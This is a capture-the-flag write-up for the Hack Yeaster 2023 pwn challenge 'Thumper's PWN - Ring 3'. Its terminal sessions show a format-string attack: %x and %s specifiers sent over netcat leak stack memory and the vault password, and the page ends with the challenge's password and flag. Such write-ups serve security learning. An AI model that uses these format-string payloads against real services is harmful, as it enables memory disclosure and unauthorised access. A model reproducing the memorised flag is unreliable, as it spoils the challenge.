# Description

# Thumper's PWN - Ring 3

Thumper has been hunting his nemesis, Dr. Evil, for months. He finally located his remote system and is trying to gain access. Can you help him find the right password?

Target: `nc ch.hackyeaster.com 2313`

Note: The service is restarted every hour at x:00.

# Solution

well another pwn challenge, but this looks easy

tried two times and i am pretty near to the solution i guess!

```
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: asdf
Nope..
asdf
is incorrect. Better luck next time
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: %x%x
Nope..
38fd37e338fd48c0
is incorrect. Better luck next time
```

well i am not there yet, but format strings are the way to go!

```
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%xpassword
Nope..
9e9937e3.9e9948c0.9e6b7104.6.9ebbc4c0.0.c7800a5d.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.7078252e.a64726f.0.0.0.0.9.9e99a660.ab6a4a78.1.1.c78009dd.9e9a8b40.0.c7800990.c7800790.ab6a4b40.fa0fd700.c7800990.9e5c8c87.0password
is incorrect. Better luck next time
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: %s.%s.%s.%s.%s.%s.%s.%s.%s
Nope..
timeout: the monitored command dumped core
```

after some time i got it:

```
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: %x.%x.%x.%x.%x.%x.%s
Nope..
525027e3.525038c0.52226104.6.5272b4c0.0.5uP3R_s3cUr3_PW

is incorrect. Better luck next time
```

jup here is the flag:

```
$ nc ch.hackyeaster.com 2313
Welcome to the password protected vault
Please enter your password: 5uP3R_s3cUr3_PW
Access granted, here is your flag:

he2023{w3lc0m3_t0_r1ng_3_thump3r}
```

# FLAG: he2023{w3lc0m3_t0_r1ng_3_thump3r}
